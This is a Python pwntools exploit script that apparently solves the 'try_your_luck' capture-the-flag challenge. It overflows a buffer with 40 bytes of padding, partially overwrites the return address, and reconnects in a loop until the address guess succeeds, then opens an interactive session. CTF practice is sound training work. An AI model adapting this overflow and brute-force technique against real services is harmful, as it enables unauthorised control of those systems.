from pwn import *

HOST: str = "luck.challs.cyberchallenge.it"
PORT: int = 9133
BIN: str = "./try_your_luck"
OFFSET: int = 40
TARGET_ADDR_LOWER_BYTES: int = 0x083a
context.arch = 'x86_64'

def get_target():
  if args.REMOTE:
    return connect(HOST, PORT)
  else:
    return process(BIN)

def main():
  i = 0

  while True:
    print(i)
    i+=1

    app = get_target()
    payload = (
      b'A' * OFFSET +
      p16(TARGET_ADDR_LOWER_BYTES)
    )
    app.send(payload)
    line = app.recvlines(2)[1]
    print(line)
    
    if b"Sorry" in line:
      app.close()
      continue
    
    app.interactive()

if __name__ == "__main__":
  main()